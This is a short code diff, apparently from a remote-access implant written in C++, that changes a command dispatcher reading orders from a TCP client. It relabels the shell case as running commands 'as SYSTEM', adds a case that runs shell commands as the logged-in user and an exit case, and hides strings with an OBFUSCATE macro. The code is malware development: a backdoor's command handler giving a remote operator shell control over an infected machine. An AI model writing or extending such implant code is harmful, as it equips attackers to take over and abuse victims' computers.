@@ -15,9 +15,14 @@ void get_command(TCPClient client) {
     case 0: // ping
         handle_ping_command(client);
         break;
-    case 1: // Execute shell
+    case 1: // Execute shell as SYSTEM
         handle_shell_command(client);
         break;
+    case 2: // Execute as user
+        handle_shell_command_as_user(client);
+        break;
+    case 3: // Exit
+        ExitThread(0);
     default:
         client.send_data(OBFUSCATE("Unknown command"));
         break;
